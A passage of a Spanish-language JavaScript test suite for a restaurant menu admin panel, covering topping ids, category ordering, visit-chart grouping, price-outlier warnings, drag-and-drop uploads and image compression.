		await correr(m, { productos: [{ id: 'p1', atributos: {} }] });

		assert.doesNotMatch(m.btnGenerarIA.textContent, /Regenerar/);
	});

	test('con un archivo elegido la IA se aparta, sin desaparecer', async () => {
		// Son dos caminos que compiten por el mismo resultado. Quien ya eligió
		// un archivo tiene una tarea empezada, y ofrecerle generar al lado
		// invita a dejarla a medias — pagando, además.
		const m = pantalla();
		const ctx = cargar('index.html', 'async function refrescarCupoIA()', 'async function generarConIA()', {
			apiFetch: async () => ({ disponibles: 20, cupo: 24 }),
			state: { restaurante: { id: 'r1' }, productos: [] },
			document: { getElementById: id => m[id] },
			encajeDeLaFotoActual: () => ({ veredicto: 'bien', mensaje: '' }),
			reintentarEncajeAlCargarLaFoto: () => {},
			videoPorAprobarDe: () => null,
			trabajoEnCursoDe: () => null,
			videoElegido: { name: 'plato.mp4' },
		});
		await ctx.refrescarCupoIA();

		assert.equal(m.btnGenerarIA.disabled, true);
		assert.match(m.iaMotivo.textContent, /Termina primero con el video que elegiste/);
	});

	test('sin archivo elegido, la IA sigue disponible', async () => {
		// La guarda de typeof no puede acabar apagando el botón siempre: sin
		// archivo, 'videoElegido' ni existe en este trozo del archivo.
		const m = pantalla();
		await correr(m, { encaje: { veredicto: 'bien', mensaje: '' } });

		assert.equal(m.btnGenerarIA.disabled, false);
	});

	test('el motivo del plato anterior no se queda pegado', async () => {
		// Abrir uno que sí puede generar después de uno que no podía dejaba en
		// pantalla la razón del anterior, que es peor que no decir nada.
		const m = pantalla();
		m.iaMotivo.textContent = 'Primero guarda el plato.';
		await correr(m, { encaje: { veredicto: 'bien', mensaje: '' } });

		assert.equal(m.iaMotivo.textContent, '');
	});

	test('una foto que no sirve apaga el botón', async () => {
		const m = pantalla();
		await correr(m, { encaje: { veredicto: 'rechaza', mensaje: 'sube una foto vertical' } });
		assert.equal(m.btnGenerarIA.disabled, true);
		assert.equal(m.iaEncaje.textContent, 'sube una foto vertical');
	});

	test('sin nada que lo impida, el botón queda vivo y sin avisos', async () => {
		const m = pantalla();
		m.btnGenerarIA.disabled = true;
		await correr(m, { encaje: { veredicto: 'bien', mensaje: '' } });
		assert.equal(m.btnGenerarIA.disabled, false);
		assert.equal(m.iaEncaje.textContent, '');
		assert.match(m.iaCupo.textContent, /quedan 20 de 24/);
	});

	test('sin cupo se apaga, pase lo que pase con la foto', async () => {
		const m = pantalla();
		await correr(m, { cupo: { disponibles: 0, cupo: 24 }, encaje: { veredicto: 'bien', mensaje: '' } });
		assert.equal(m.btnGenerarIA.disabled, true);
		assert.match(m.iaCupo.textContent, /sin animaciones/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('toppingsQueSeQuitan · qué platos pierden algo con este guardado', () => {
	// Desde que los platos guardan el identificador, esto solo puede pasar al
	// BORRAR un elemento del catálogo: renombrarlo ya no los desengancha. Sigue
	// comparando también por nombre porque un plato que nadie haya vuelto a
	// guardar desde la migración todavía puede llevar nombres dentro.
	//
	// El segundo argumento es lo que dice la base: se compara contra eso, y no
	// contra lo que exista, desde el 16/09/2026.
	const buscar = (toppingState, productos, guardado = catalogo) => cargar('toppings.js',
		[['function toppingsQueSeQuitan', null]],
		{ toppingState, state: { productos }, catalogoDe: () => guardado }).toppingsQueSeQuitan();

	const catalogo = {
		platino: [{ id: 't_que', nombre: 'Queso' }],
		premium: [{ id: 't_toc', nombre: 'Tocineta', precio: 3000 }],
		salsas:  [{ id: 't_bbq', nombre: 'BBQ' }],
	};
	const plato = nombre => ({
		nombre, atributos: { personalizacion: { platino: ['t_que'], premium: ['t_toc'], salsas: ['t_bbq'] } },
	});

	test('con el catálogo intacto no avisa de nada', () => {
		// .length y no deepEqual con []: lo que devuelve la función se
		// construye dentro de la VM, así que su Array.prototype no es el de
		// aquí y la comparación estricta falla por el prototipo, no por el
		// contenido.
		assert.equal(buscar(catalogo, [plato('Hamburguesa')]).length, 0);
	});

	test('RENOMBRAR ya no delata a nadie, que es el cambio', () => {
		// Antes esto avisaba de los dos platos y había que volver a marcarlos a
		// mano en cada ficha. El identificador no cambia, así que no se pierde
		// nada y no hay nada que avisar.
		const renombrado = { ...catalogo, premium: [{ id: 't_toc', nombre: 'Tocineta ahumada', precio: 3000 }] };
		assert.equal(buscar(renombrado, [plato('Hamburguesa'), plato('Perro')]).length, 0);
	});

	test('borrar uno sí delata los platos que lo ofrecían', () => {
		const avisos = buscar({ ...catalogo, salsas: [] }, [plato('Hamburguesa'), plato('Perro')]);
		assert.equal(avisos.length, 2, 'los dos platos lo ofrecían');
		assert.match(avisos[0], /Hamburguesa/);
		assert.match(avisos[0], /BBQ/, 'por su nombre');
		assert.doesNotMatch(avisos[0], /t_bbq/, 'un identificador no le dice nada a nadie');
	});

	test('un plato que ya apuntaba a algo borrado ANTES no pregunta en cada guardado', () => {
		// El caso de zz-pruebas-ux el 16/09/2026: catálogo vacío y dos platos
		// apuntando a toppings borrados hacía tiempo. Cambiar una red social
		// preguntaba por ellos cada vez.
		const vacio = { platino: [], premium: [], salsas: [] };
		assert.equal(buscar(vacio, [plato('Papas'), plato('Combo')], vacio).length, 0);
	});

	test('un plato sin migrar, guardado por nombre, también cuenta', () => {
		// Avisar de más es mejor que callarse de menos: mientras quede un plato
		// con nombres, borrar del catálogo tiene que seguir preguntando.
		const porNombre = { nombre: 'Perro', atributos: { personalizacion: { salsas: ['BBQ'] } } };
		assert.equal(buscar(catalogo, [porNombre]).length, 0, 'mientras exista, no estorba');
		const avisos = buscar({ ...catalogo, salsas: [] }, [porNombre]);
		assert.equal(avisos.length, 1);
		assert.match(avisos[0], /BBQ/);
	});

	test('un plato sin personalización no estorba', () => {
		assert.equal(buscar({ ...catalogo, salsas: [] }, [{ nombre: 'Gaseosa', atributos: {} }]).length, 0);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('confirmAddTopping · añadir y renombrar en la pestaña Toppings', () => {
	// Renombrar no se podía hacer desde el panel: solo añadir y borrar,
	// justamente porque renombrar dejaba a los platos apuntando a un nombre
	// que ya no existía. Ahora conserva el identificador, así que es seguro.
	const montar = (toppingState, campos) => {
		const avisos = [];
		const elementos = {};
		const el = id => (elementos[id] ||= { value: '', textContent: '', style: {} });
		for (const [id, v] of Object.entries(campos)) el(id).value = v;

		const ctx = cargar('index.html', [
			['function catalogoDe', '// ── PERSONALIZACIÓN DEL PLATO'],
			['toppings.js', 'const CONTENEDOR_TOPPING', null],
		], {
			toppingState,
			document: { getElementById: el },
			showToast: (m, t) => avisos.push([t, m]),
			openModal: () => {}, closeModal: () => {},
			renderToppingList: () => {},
			state: { productos: [], restaurante: { id: 'r1' } },
			apiFetch: async () => ({}),
			ajustarPestanasAlModelo: () => {}, fijarFotoDePestana: () => {},
			confirm: () => true,
			crypto: globalThis.crypto,
		});
		ctx.confirmAddTopping();
		return avisos;
	};

	const nuevoEstado = () => ({
		platino: [{ id: 't_que', nombre: 'Queso' }],
		premium: [{ id: 't_toc', nombre: 'Tocineta', precio: 3000 }],
		salsas:  [],
	});

	test('renombrar CONSERVA el identificador', () => {
		// La prueba que justifica el cambio entero. Si el id cambiara, todos los
		// platos que ofrecen ese topping se quedarían colgados en silencio.
		const st = nuevoEstado();
		montar(st, { toppingTipo: 'platino', toppingIndice: '0', toppingNombre: 'Queso doble' });
		assert.equal(st.platino[0].id, 't_que', 'el identificador no se toca');
		assert.equal(st.platino[0].nombre, 'Queso doble');
		assert.equal(st.platino.length, 1, 'no crea uno nuevo');
	});

	test('renombrar un premium puede cambiarle el precio', () => {
		const st = nuevoEstado();
		montar(st, { toppingTipo: 'premium', toppingIndice: '0', toppingNombre: 'Tocineta', toppingPrecio: '5000' });
		assert.equal(st.premium[0].id, 't_toc');
		assert.equal(st.premium[0].precio, 5000);
	});

	test('añadir uno nuevo le pone un identificador propio', () => {
		const st = nuevoEstado();
		montar(st, { toppingTipo: 'salsas', toppingIndice: '', toppingNombre: 'BBQ' });
		assert.equal(st.salsas.length, 1);
		assert.match(st.salsas[0].id, /^top_[a-z0-9]{1,8}$/);
		assert.equal(st.salsas[0].nombre, 'BBQ');
	});

	test('el identificador nuevo no choca con los de los otros grupos', () => {
		// Los platos guardan una lista por grupo, pero un choque entre grupos
		// confundiría a cualquiera que lea 'atributos' a mano.
		const st = nuevoEstado();
		for (const nombre of ['BBQ', 'Rosada', 'Ajo'])
			montar(st, { toppingTipo: 'salsas', toppingIndice: '', toppingNombre: nombre });
		const todos = [...st.platino, ...st.premium, ...st.salsas].map(t => t.id);
		assert.equal(new Set(todos).size, todos.length, 'todos distintos');
	});

	test('un nombre repetido se rechaza', () => {
		const st = nuevoEstado();
		const avisos = montar(st, { toppingTipo: 'platino', toppingIndice: '', toppingNombre: '  queso ' });
		assert.equal(st.platino.length, 1, 'no se añade');
		assert.equal(avisos[0][0], 'error');
	});

	test('renombrar sin cambiar el nombre no se rechaza a sí mismo', () => {
		// Entrar a editar solo para tocar el precio no puede dar "ya existe".
		const st = nuevoEstado();
		const avisos = montar(st, { toppingTipo: 'premium', toppingIndice: '0', toppingNombre: 'Tocineta', toppingPrecio: '7000' });
		assert.equal(st.premium[0].precio, 7000);
		assert.ok(!avisos.some(a => a[0] === 'error'), 'no debe quejarse');
	});

	test('un nombre vacío no crea nada', () => {
		const st = nuevoEstado();
		const avisos = montar(st, { toppingTipo: 'salsas', toppingIndice: '', toppingNombre: '   ' });
		assert.equal(st.salsas.length, 0);
		assert.equal(avisos[0][0], 'error');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('moveCat · reordenar cuando dos categorías empatan en "orden"', () => {
	// Intercambiaba los dos valores de 'orden'. Con dos categorías empatadas
	// eso es intercambiar un número consigo mismo: no se movía nada y el panel
	// decía "Orden actualizado" igual. Y empatar es fácil — openNewCatModal
	// siembra `orden = state.categorias.length`, así que basta borrar una
	// categoría y crear otra.
	const mover = async (categorias, id, dir) => {
		const patches = [];
		const ctx = cargar('index.html', [
			['async function enTandas', 'function ordenProductosModo'],
			['// Reasigna 0,1,2… a toda la lista', '// ── ELIMINAR'],
		], {
			state: { categorias, restaurante: { id: 'r1' } },
			apiFetch: async (m, ruta, cuerpo) => { patches.push({ ruta, ...cuerpo }); return {}; },
			renderCatList() {}, renderCatFilter() {}, showToast() {}, avisarGuardadoConCarta() {},
			document: { querySelector: () => null },
		});
		await ctx.moveCat(id, dir);
		return { patches,
			orden: ctx.state.categorias.map(c => c.nombre),
			valores: ctx.state.categorias.map(c => c.orden) };
	};

	test('con órdenes ya distintos, mueve como siempre', async () => {
		const { orden } = await mover(
			[{ id: 'a', nombre: 'Entradas', orden: 0 }, { id: 'b', nombre: 'Fuertes', orden: 1 }], 'b', -1);
		assert.deepEqual([...orden], ['Fuertes', 'Entradas']);
	});

	test('con dos empatadas en 0, el movimiento sí ocurre', async () => {
		const { orden, valores } = await mover(
			[{ id: 'a', nombre: 'Entradas', orden: 0 }, { id: 'b', nombre: 'Postres', orden: 0 }], 'b', -1);
		assert.deepEqual([...orden], ['Postres', 'Entradas'], 'antes se quedaban como estaban');
		// Y el empate se deshace: 0 y 1, no dos ceros. Se mira el resultado y no
		// cuántos PATCH salieron — solo se manda lo que de verdad cambia, así
		// que una de las dos puede quedarse con el número que ya tenía.
		assert.deepEqual([...valores], [0, 1]);
	});

	test('no se sale por los extremos', async () => {
		const cats = [{ id: 'a', nombre: 'Entradas', orden: 0 }, { id: 'b', nombre: 'Fuertes', orden: 1 }];
		assert.equal((await mover(cats, 'a', -1)).patches.length, 0, 'la primera no sube');
		assert.equal((await mover(cats, 'b', 1)).patches.length, 0, 'la última no baja');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('agruparVisitas · la gráfica no puede pintar una barra por día', () => {
	// Con una barra por día, el rango "Todo" —que arranca en 2020— pintaba
	// 2.431 barras: unos 41.000 px de scroll horizontal que nadie recorre. Y
	// el `Math.max(1, ...dias)` recibía un argumento por día, así que un rango
	// bastante antiguo lo hacía reventar.
	const ctx = () => cargar('estadisticas.js', [
		['function fmtISO', 'function hoyEnZona'],
		['const MAX_BARRAS_VISITAS', 'function renderGraficaVisitas'],
	], {});

	const agrupar = (visitas, desde, hasta) => ctx().agruparVisitas(visitas, desde, hasta);

	test('un rango corto sigue siendo un día por barra', () => {
		const { barras, porBarra } = agrupar({ '2026-08-01': 3, '2026-08-03': 5 }, '2026-08-01', '2026-08-05');
		assert.equal(porBarra, 1);
		assert.equal(barras.length, 5);
		assert.equal(barras[0].visitas, 3);
		assert.equal(barras[1].visitas, 0, 'los días sin visitas cuentan cero, no se saltan');
		assert.equal(barras[2].visitas, 5);
	});

	test('el rango "Todo" se agrupa en vez de desbordarse', () => {
		const { barras, porBarra } = agrupar({}, '2020-01-01', '2026-08-27');
		assert.ok(barras.length <= 92, `92 como mucho, salieron ${barras.length}`);
		assert.ok(porBarra > 1, 'tiene que haber agrupado');
		assert.equal(barras[0].desde, '2020-01-01', 'empieza donde se pidió');
		assert.equal(barras[barras.length - 1].hasta, '2026-08-27', 'y termina donde se pidió');
	});

	test('agrupando no se pierde ni se duplica ninguna visita', () => {
		// Lo que más importa: la suma de las barras tiene que ser la suma de
		// los días. Si el agrupado se saltara un día o lo contara dos veces,
		// la gráfica mentiría y no habría forma de notarlo a ojo.
		const visitas = {};
		let total = 0;
		const d = new Date(Date.UTC(2025, 0, 1, 12));
		for (let i = 0; i < 400; i++) {
			const iso = d.toISOString().slice(0, 10);
			visitas[iso] = i % 7;
			total += i % 7;
			d.setUTCDate(d.getUTCDate() + 1);
		}
		const { barras } = agrupar(visitas, '2025-01-01', '2026-02-04');
		assert.equal(barras.reduce((s, b) => s + b.visitas, 0), total);
	});

	test('un rango al revés se avisa, no se pinta vacío', () => {
		const r = agrupar({}, '2026-08-27', '2026-08-01');
		assert.equal(r.invertido, true);
		assert.equal(r.barras.length, 0);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('avisarSiElPrecioSeSale · el cero de más', () => {
	// Un plato se creó a 2.500.000 en una carta cuya mediana son 25.000. No es
	// un precio prohibido —la plataforma no puede saber qué vende cada uno—
	// pero sí es un número que no se parece a nada del resto de su carta.
	//
	// Se avisa contra la MEDIANA del propio restaurante y no contra un tope
	// fijo: 60.000 es caro en una salchipapería y barato en un restaurante de
	// autor, y aquí hay de los dos.
	//
	// El umbral de 10 sale de mirar las cartas reales el 03/09/2026: el plato
	// más caro de cada una está entre 1,1 y 3 veces su mediana. Diez deja
	// sitio de sobra para lo legítimo y caza el cero de más, que son 10 veces
	// exactas.

	const montar = (precio, productos, id = 'nuevo') => {
		const mapa = {
			editPrecioNum: { value: String(precio) },
			editProductId: { value: id },
			precioAviso:   { textContent: '', style: {} },
		};
		const ctx = cargar('index.html', 'const VECES_LA_MEDIANA_PARA_AVISAR', 'function quitarFoto', {
			state: { productos },
			document: { getElementById: i => mapa[i] },
			formatPrecio: n => `$ ${n}`,
		});
		ctx.avisarSiElPrecioSeSale();
		return mapa.precioAviso.textContent;
	};

	// Una carta como las de verdad: mediana 25.000.
	const carta = [20000, 22000, 25000, 28000, 31000, 60000]
		.map((n, i) => ({ id: `p${i}`, precio_numerico: n }));

	test('un precio con un cero de más se avisa', () => {
		assert.match(montar(2500000, carta), /veces la mediana/);
	});

	test('el plato más caro de una carta real NO se avisa', () => {
		// bonzas llega a 3 veces su mediana con 97 platos. Avisar ahí sería
		// enseñar a ignorar el aviso.
		assert.equal(montar(66000, carta), '');
	});

	test('tampoco se avisa un precio normal', () => {
		assert.equal(montar(24000, carta), '');
	});

	test('con pocos platos no se dice nada', () => {
		// Con dos precios, cualquier tercero duplica la mediana. Avisar mal es
		// peor que no avisar.
		const pocos = [{ id: 'a', precio_numerico: 20000 }, { id: 'b', precio_numerico: 25000 }];
		assert.equal(montar(2500000, pocos), '');
	});

	test('el propio plato no cuenta para su mediana', () => {
		// Editar un plato caro no puede hacer que su propio precio parezca
		// normal por estar dentro del cálculo.
		const conElCaro = [...carta, { id: 'caro', precio_numerico: 2500000 }];
		assert.match(montar(2500000, conElCaro, 'caro'), /veces la mediana/);
	});

	test('un precio vacío o cero no dispara nada', () => {
		assert.equal(montar(0, carta), '');
	});

	test('el aviso pregunta, no corrige', () => {
		// El restaurante sabe lo que vende. Lo único que sabe el panel es que
		// ese número no se parece al resto de su carta.
		const texto = montar(2500000, carta);
		assert.match(texto, /¿Es correcto\?/);
		assert.doesNotMatch(texto, /no puedes|inválido|error/i);
	});
});

describe('arrastrar y soltar · sin una segunda copia de la subida', () => {
	// Soltar hace lo mismo que elegir con el diálogo: el archivo se mete en el
	// <input> de siempre y se dispara su 'change'. Ningún manejador de subida
	// se entera de que existe otra vía, así que no hay una segunda copia de la
	// lógica que se quede atrás cuando alguien toque la primera.

	const IMG = 'image/*';
	const VID = 'video/mp4,video/quicktime,.mp4,.mov,.m4v';

	const soloTipo = () => cargar('index.html', [['function tipoAceptado', 'function habilitarArrastre']], {});

	test('una imagen pasa donde se piden imágenes', () => {
		const { tipoAceptado } = soloTipo();
		assert.equal(tipoAceptado({ getAttribute: () => IMG }, { type: 'image/jpeg', name: 'a.jpg' }), true);
		assert.equal(tipoAceptado({ getAttribute: () => IMG }, { type: 'image/png', name: 'a.png' }), true);
	});

	test('un PDF sobre la foto del plato, no', () => {
		// Sin esto llega al manejador, falla al decodificarse, y el mensaje
		// habla de otra cosa.
		const { tipoAceptado } = soloTipo();
		assert.equal(tipoAceptado({ getAttribute: () => IMG }, { type: 'application/pdf', name: 'menu.pdf' }), false);
	});

	test('el video se acepta por tipo o por extensión', () => {
		// Un .mov de iPhone llega a veces con el tipo vacío, y por eso la lista
		// de 'accept' incluye las extensiones además de los tipos.
		const { tipoAceptado } = soloTipo();
		assert.equal(tipoAceptado({ getAttribute: () => VID }, { type: 'video/mp4', name: 'p.mp4' }), true);
		assert.equal(tipoAceptado({ getAttribute: () => VID }, { type: '', name: 'PLATO.MOV' }), true);
		assert.equal(tipoAceptado({ getAttribute: () => VID }, { type: 'image/jpeg', name: 'a.jpg' }), false);
	});

	// ── EL ARCHIVO TIENE QUE LLEGAR AL INPUT DE VERDAD ────────

	const montarZona = ({ conDataTransfer = true } = {}) => {
		const oyentes = {};
		const zona = {
			dataset: {}, classList: { add() {}, remove() {} },
			contains: () => false,
			addEventListener: (ev, fn) => { oyentes[ev] = fn; },
		};
		const input = {
			dataset: { zona: 'z' }, files: null, cambios: 0, manejadoresLlamados: 0,
            getAttribute: () => IMG,
			closest: () => null,
			dispatchEvent(e) { if (e && e.type === 'change') this.cambios++; return true; },
			onchange() { this.manejadoresLlamados++; },
		};
		const avisos = [];
		const ctx = cargar('index.html', [['function tipoAceptado', '// ── ARRANQUE']], {
			document: {
				querySelectorAll: () => [input],
				getElementById: () => zona,
			},
			window: { addEventListener() {} },
			showToast: (m, t) => avisos.push([t, m]),
			Event: class { constructor(t) { this.type = t; } },
			...(conDataTransfer ? {
				DataTransfer: class { constructor() { this.items = { add: f => { this.archivo = f; } }; }
				                      get files() { return [this.archivo]; } },
			} : {}),
		});
		ctx.habilitarArrastre();
		const soltar = archivo => oyentes.drop({
			preventDefault() {}, stopPropagation() {},
			dataTransfer: { files: archivo ? [archivo] : [] },
		});
		return { soltar, input, avisos };
	};

	test('el archivo soltado acaba en el input y se dispara su change', () => {
		// Es lo que hace que no haya una segunda ruta de subida: a partir de
		// aquí es indistinguible de haberlo elegido a mano.
		const { soltar, input } = montarZona();
		soltar({ type: 'image/jpeg', name: 'plato.jpg' });

		assert.equal(input.files[0].name, 'plato.jpg');
		assert.equal(input.cambios, 1);
	});

	test('un archivo que no encaja se rechaza y se dice por qué', () => {
		const { soltar, input, avisos } = montarZona();
		soltar({ type: 'application/pdf', name: 'carta.pdf' });

		assert.equal(input.cambios, 0, 'no se sube nada');
		assert.match(avisos[0][1], /no es una imagen/);
	});

	test('soltar algo que no es un archivo no hace nada', () => {
		// Arrastrar texto seleccionado de otra pestaña, por ejemplo.
		const { soltar, input } = montarZona();
		soltar(null);
		assert.equal(input.cambios, 0);
	});

	test('sin DataTransfer se llama al manejador igual', () => {
		// Navegador que no deja construirlo: la subida tiene que seguir
		// funcionando, no quedarse en silencio.
		const { soltar, input } = montarZona({ conDataTransfer: false });
		soltar({ type: 'image/jpeg', name: 'plato.jpg' });

		assert.equal(input.manejadoresLlamados, 1);
	});
});

describe('los avisos usan una variable de color que existe', () => {
	// --warning no existe: solo está definida --warn. Un var() sin definir hace
	// que la declaración se descarte y el texto herede el color de al lado, o
	// sea que el aviso salía igual que el texto normal. Comprobado en navegador.
	const src = codigoDelPanel();

	test('nadie escribe var(--warning)', () => {
		assert.ok(!src.includes('var(--warning)'),
			'esa variable no existe: los avisos saldrían del color del texto normal');
	});

	test('y --warn sigue definida', () => {
		assert.ok(src.includes('--warn: #'), 'es la que sí existe');
	});
});

describe('la pista "o arrástralo aquí" · sin prometer nada al teléfono', () => {
	// La pista se esconde donde no hay ratón. Eso la hace útil y la hace
	// peligrosa a la vez: lo que se meta dentro desaparece para la mayoría de
	// los usuarios, que entran desde el móvil.
	const src = codigoDelPanel();
	const pistas = [...src.matchAll(/class="pista-arrastre"[^>]*>([^<]*)</g)].map(m => m[1]);

	test('todas las zonas donde se puede soltar lo anuncian', () => {
		// Media pantalla con pista y media sin ella enseña que la función no
		// existe: se prueba donde no lo dice, no pasa nada, y no se reintenta.
		//
		// Se cuentan las zonas en vez de fijar un número: un número hay que
		// subirlo cada vez que se añade una, y quien lo sube pensando "ya, es
		// que hay una más" no comprueba si esa nueva trae su pista. La regla
		// que importa es que haya tantas pistas como sitios donde soltar.
		const zonas = (src.match(/class="upload-zone"/g) || []).length
		            + (src.match(/data-zona="/g) || []).length;
		assert.equal(pistas.length, zonas,
			'hay una zona donde se puede soltar que no lo dice');
	});

	test('dentro de la pista solo va lo que sobra sin ratón', () => {
		// Si alguien mete aquí "haz clic para subir", el usuario de teléfono
		// se queda sin la única instrucción que le servía.
		//
		// Es una lista de palabras PERMITIDAS, no de prohibidas. La primera versión
		// prohibía «clic», y la pista de Promoción se coló diciendo «Pulsa «Añadir
		// promoción» o arrastra una imagen aquí»: tenía «arrastra» y no tenía
		// «clic», así que pasaba (M5). Una lista negra hay que ampliarla con cada
		// sinónimo —pulsa, toca, sube, elige…— y el fallo llega siempre por el que
		// faltaba. Aquí cualquier palabra que no sea de arrastrar la tumba.
		const PERMITIDAS = new Set(['o', 'también', 'puedes', 'arrastra', 'arrastrar', 'arrástralo',
			'arrástrala', 'arrástralas', 'la', 'las', 'lo', 'una', 'un', 'el', 'imagen', 'imágenes', 'video',
			'aquí', 'hasta', 'este', 'recuadro']);
		for (const texto of pistas) {
			assert.match(texto, /arrastr|arrástra/i, `esta pista no habla de arrastrar: "${texto}"`);
			const ajenas = texto.toLowerCase().split(/[^a-záéíóúñü]+/).filter(p => p && !PERMITIDAS.has(p));
			assert.deepEqual(ajenas, [], `esta pista esconde algo que hace falta sin ratón: "${texto}"`);
		}
	});

	test('la lista de permitidas caza el caso que se le escapó a la de prohibidas', () => {
		// M5, convertido en prueba: la frase exacta que pasó la comprobación vieja.
		const PERMITIDAS = new Set(['o', 'arrastra', 'una', 'imagen', 'aquí']);
		const texto = 'Pulsa «Añadir promoción» o arrastra una imagen aquí.';
		const ajenas = texto.toLowerCase().split(/[^a-záéíóúñü]+/).filter(p => p && !PERMITIDAS.has(p));
		assert.deepEqual(ajenas, ['pulsa', 'añadir', 'promoción']);
	});

	test('el recuadro vacío de Destacados dice qué hacer también sin ratón', () => {
		// M4. Lo que queda fuera de las pistas es lo que ve un teléfono.
		const vacio = src.match(/<div id="promoVacio"[^>]*>([\s\S]*?)<\/div>/)[1];
		const sinPistas = vacio.replace(/<span class="pista-arrastre">[^<]*<\/span>/g, '').replace(/<!--[\s\S]*?-->/g, '');
		assert.match(sinPistas, /Pulsa «Añadir destacado»/);
	});

	test('está escondida por defecto y solo aparece con ratón', () => {
		// Al revés —visible por defecto y escondida en móvil— haría falta
		// acertar con el ancho de pantalla, y el ancho no dice si hay ratón.
		assert.ok(src.includes('.pista-arrastre { display: none; }'),
			'la pista tiene que estar escondida por defecto');
		assert.ok(src.includes('@media (hover: hover) and (pointer: fine)'),
			'y aparecer solo donde hay ratón — no por ancho de pantalla');
	});
});

describe('imágenes adicionales · el tope de cuatro sin el botón "+"', () => {
	// El '+' desaparece al llegar a cuatro, y mientras esa fue la única forma
	// de añadir, eso bastaba como tope. Soltar un archivo no pasa por el
	// botón: sin una comprobación aparte, la quinta imagen entraba.
	const montar = extras => {
		const subidas = [];
		const avisos = [];
		const ctx = cargar('index.html', [['const MAX_IMAGENES_EXTRA', '// ── LA FICHA SEGÚN EL MODELO']], {
			state: { extraImgs: [...extras] },
			document: { getElementById: () => ({ innerHTML: '', appendChild() {}, querySelector: () => ({}) }) },
			showToast: (m, t) => avisos.push([t, m]),
			compressImage: async b => { subidas.push(b); return b; },
			uploadImg: async () => 'https://x/nueva.jpg',
			esc: v => v,
		});
		return { ctx, subidas, avisos };
	};

	test('la quinta no se sube', () => {
		const { ctx, subidas, avisos } = montar(['a', 'b', 'c', 'd']);
		const input = { files: [{ name: 'quinta.jpg' }], value: 'quinta.jpg' };
		ctx.handleExtraImgUpload(input);

		assert.equal(subidas.length, 0, 'no llega a comprimirse ni a subirse');
		assert.equal(ctx.state.extraImgs.length, 4);
		assert.match(avisos[0][1], /máximo/);
		assert.equal(input.value, '', 'se limpia el input o el mismo archivo no vuelve a entrar');
	});

	test('la cuarta sí', async () => {
		const { ctx, subidas } = montar(['a', 'b', 'c']);
		await ctx.handleExtraImgUpload({ files: [{ name: 'cuarta.jpg' }], value: '' });

		assert.equal(subidas.length, 1);
		assert.equal(ctx.state.extraImgs.length, 4);
	});
});

describe('compressImage · formato de salida y fallos que antes colgaban', () => {
	// Dos fallos en la misma función. Salía siempre JPEG, y JPEG no tiene canal
	// alfa: un logo PNG con fondo transparente acababa con un rectángulo negro.
	// Y la promesa no tenía 'rej' ni manejadores de error, así que un archivo
	// que no decodificaba dejaba la promesa sin resolver PARA SIEMPRE — el
	// panel se quedaba en "Subiendo..." y no había más salida que recargar.
	function entorno({ fallaLectura = false, fallaDecodificacion = false, blobNulo = false,
	                   haceWebp = false } = {}) {
		const visto = {};
		return {
			visto,
			FileReader: class {
				readAsDataURL() {
					setTimeout(() => fallaLectura ? this.onerror?.() : this.onload?.({ target: { result: 'data:,' } }), 0);
				}
			},
			Image: class {
				constructor() { this.width = 1000; this.height = 500; }
				set src(_) { setTimeout(() => fallaDecodificacion ? this.onerror?.() : this.onload?.(), 0); }
			},
			document: {
				createElement: () => ({
					getContext: () => ({ drawImage() {} }),
					toBlob(cb, tipo) { visto.tipo = tipo; cb(blobNulo ? null : { type: tipo }); },
					// Un navegador que no encodea WebP no falla al pedírselo:
					// devuelve un PNG. Se imita porque es justo lo que hace
					// peligroso el cambio, y lo que la detección tiene que ver.
					toDataURL: tipo => (haceWebp && tipo === 'image/webp')
						? 'data:image/webp;base64,AA' : 'data:image/png;base64,AA',
				}),
			},
		};
	}

	const comprimir = (archivo, opciones, fallos) => {
		const ctx = entorno(fallos);
		const cargado = cargar('index.html', [['let _haceWebp', 'async function uploadImg']], ctx);
		return { promesa: cargado.compressImage(archivo, 500, .9, opciones), visto: ctx.visto };
	};

	// ── CON WEBP, QUE ES EL CAMINO NORMAL HOY ─────────────────
	// La misma foto pesa entre un 30% y un 40% menos, y eso lo paga el
	// comensal en datos móviles cada vez que abre una carta.

	test('una foto sale en WebP si el navegador sabe', async () => {
		const { promesa, visto } = comprimir({ type: 'image/jpeg' }, {}, { haceWebp: true });
		const blob = await promesa;
		assert.equal(visto.tipo, 'image/webp');
		assert.equal(blob.type, 'image/webp');
	});

	test('un logo también, porque WebP sí tiene transparencia', async () => {
		// Salía en PNG solo para no perder el canal alfa. WebP lo tiene, así
		// que se conserva igual y pesando bastante menos.
		const { promesa, visto } = comprimir({ type: 'image/png' }, { conservarTransparencia: true }, { haceWebp: true });
		await promesa;
		assert.equal(visto.tipo, 'image/webp');
	});

	// ── SIN WEBP, TODO SIGUE COMO ESTABA ──────────────────────
	// Y esto es lo que hace seguro el cambio. toBlob() no falla cuando no sabe
	// producir el tipo que se le pide: devuelve un PNG. Un PNG de una foto
	// pesa varias veces lo que el JPEG de antes, así que dar el soporte por
	// supuesto habría empeorado las cartas en Safari anterior a la 16.4 —en
	// silencio, que es lo peor.

	test('un logo PNG se queda en PNG', async () => {
		const { promesa, visto } = comprimir({ type: 'image/png' }, { conservarTransparencia: true });
		const blob = await promesa;
		assert.equal(visto.tipo, 'image/png');
		assert.equal(blob.type, 'image/png');
	});

	test('una foto de plato sigue saliendo JPEG', async () => {
		const { promesa, visto } = comprimir({ type: 'image/png' }, {});
		await promesa;
		assert.equal(visto.tipo, 'image/jpeg', 'sin pedirlo, no se conserva la transparencia');
	});

	test('un JPEG no se convierte a PNG aunque se pida transparencia', async () => {
		// Convertirlo no recupera una transparencia que nunca tuvo, y sí
		// multiplica el peso.
		const { promesa, visto } = comprimir({ type: 'image/jpeg' }, { conservarTransparencia: true });
		await promesa;
		assert.equal(visto.tipo, 'image/jpeg');
	});

	test('nunca se pide WebP a quien no sabe hacerlo', async () => {
		// Sería pedir un PNG por la puerta de atrás, que es peor que el JPEG.
		const { promesa, visto } = comprimir({ type: 'image/jpeg' }, {});
		await promesa;
		assert.notEqual(visto.tipo, 'image/webp');
	});

	test('un archivo que no decodifica RECHAZA en vez de colgarse', async () => {
		const { promesa } = comprimir({ type: 'image/png' }, {}, { fallaDecodificacion: true });
		await assert.rejects(() => promesa, /no es una imagen/);
	});

	test('un archivo ilegible también rechaza', async () => {
		const { promesa } = comprimir({ type: 'image/png' }, {}, { fallaLectura: true });
